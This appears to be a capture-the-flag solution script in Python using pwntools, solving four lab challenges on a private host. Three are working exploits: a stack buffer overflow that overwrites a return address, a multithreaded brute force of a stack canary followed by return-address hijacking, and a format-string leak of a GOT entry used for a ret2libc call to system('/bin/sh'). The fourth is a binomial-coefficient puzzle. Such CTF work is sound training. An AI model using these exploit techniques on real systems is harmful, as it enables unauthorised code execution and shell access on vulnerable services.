import sys
from pwn import *  # https://github.com/Gallopsled/pwntools
import re
import time
import concurrent.futures
from math import comb

# pip install pwntools

def problem1():
    print("Problem: BufferOverflow")
    r = remote("10.0.118.48", 4455)
    r.recvuntil(b'--------------\n')
    r.send(b'''python3 -c "import sys; sys.stdout.buffer.write(b'JASKIRAT'*21 + b'\x1d\x07\x40\x00\x00\x00\x00\x00')" | ./vuln\n''')
    r.recvline()
    r.recvline()
    flag = r.recvline()
    print(f"Flag: {flag.decode()}")
    r.close()


def problem2():
    print("Problem: BufferOverflowCagedBird")
    found = False

    def guess_next_byte(guess, known_canary):
        nonlocal found
        if found:
            return None
        target_byte = bytes([guess])
        try:
            p = remote("10.0.118.48", 4456)
            p.recvuntil(
                b"--------------------\n", timeout=2
            )
            p.sendline(b"./vuln")
            p.recvuntil(b"how many bytes to read\n", timeout=2)

            # Size: 128 padding + known canary + 1 guess
            read_size = 128 + len(known_canary) + 1
            p.sendline(str(read_size).encode())
            p.recvuntil(b"Now enter the string\n", timeout=2)
            payload = b"JASKIRAT" * 16 + known_canary + target_byte
            p.send(payload)
            time.sleep(0.1)
            response = p.clean(timeout=1)
            p.close()
            if b"hacker detected!" not in response:
                return target_byte
        except Exception:
            pass
        finally:
            try:
                p.close()
            except:
                pass
        return None

    def brute_force():
        global found
        canary = b""
        for byte_idx in range(4):
            found = False
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                futures = [executor.submit(guess_next_byte, g, canary) for g in range(256)]

                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result is not None:
                        found = True
                        print(f"Found byte {byte_idx + 1}: {result.hex()}")
                        canary += result
                        break
        print(f"Canary: {canary.decode()}")
        return canary


    def get_flag(canary):
        p = remote("10.0.118.48", 4456)
        p.recvuntil(b"--------------------\n", timeout=2)
        p.sendline(b"./vuln")
        p.recvuntil(b"how many bytes to read\n", timeout=2)

        # 128 bytes to fill buffer + 4 bytes canary + 12 bytes padding + 8 bytes saved RBP overwrite + 8 bytes RIP overwrite (WIN_ADDR)
        payload = b"JASKIRAT" * 16
        payload += canary
        payload += b"JASKIRAT" * 2 + b"JASK"
        payload += p64(0x4008FD)

        p.sendline(str(len(payload)).encode())
        p.recvuntil(b"Now enter the string\n", timeout=2)

        p.send(payload)
        sleep(2)
        p.recvline()
        p.recvline()
        p.recvline()
        print(f"Flag: {p.recvline().decode()}")
        p.close()

    if __name__ == "__main__":
        canary = brute_force()
        # canary = b"itsY"
        get_flag(canary)



def problem3():
    """
    Reference: https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
    """
    print("Problem: Smash")
    
    hello_elf = ELF('./problems/smash/hello')
    libc = ELF('./problems/smash/libc-2.23.so') 

    printf_got = hello_elf.got['printf'] 
    main_addr = hello_elf.symbols['main']

    payload_initial:str = p32(printf_got) + b"plswork %s plswork"  
    # %s -> treat printf_got (first element on stack) addr as char
    # pointer and print the string. so we get the actual address of
    # the printf fucntion.
    payload_initial += (132 - len(payload_initial)) * b'J' + p32(main_addr) 
    # we cannot exit and reconnect cause then alsr randomization
    # might change
    
    p = remote('10.0.118.48', 3377)
    p.recvuntil(b"What's your name?\n") 
    p.sendline(payload_initial)
    p.recvuntil(b'plswork ')
    s = p.recvuntil(b' plswork')
    actual_printf = u32(s.strip()[:4])

    offset = actual_printf - libc.symbols['printf']

    system_addr = libc.symbols['system'] + offset 
    binsh_addr = list(libc.search(b'/bin/sh\x00'))[0] + offset 

    payload_final = b'JASKIRAT' * 16 + b'JASK' + p32(system_addr) + p32(0xbadabada) # radon return address for system 
    payload_final += p32(binsh_addr) # pass in argument to system

    p.recvuntil(b"What's your name?\n")
    p.sendline(payload_final)
    sleep(5)
    p.sendline('cat flag.txt'.encode())
    p.recvline()
    print(f"Flag: {p.recvall(5).decode()}")


def problem4():
    print("Problem: Reverse")
    r = remote("10.0.118.48", 6464)
    n = int(r.recvline().strip().decode())
    s = ''
    for i in range(n+1):
        s+=str(comb(n,i)) + '\n'
        
    r.send(s.encode())
    f = r.recvall()
    print(f"Flag: {f.decode()}")
    r.close()


if __name__ == "__main__":
    n = sys.argv
    if len(n) != 2:
        print(f"Usage solution.py <problem_id>")
        exit()
    prob = int(n[1])
    exec(f"problem{prob}()")
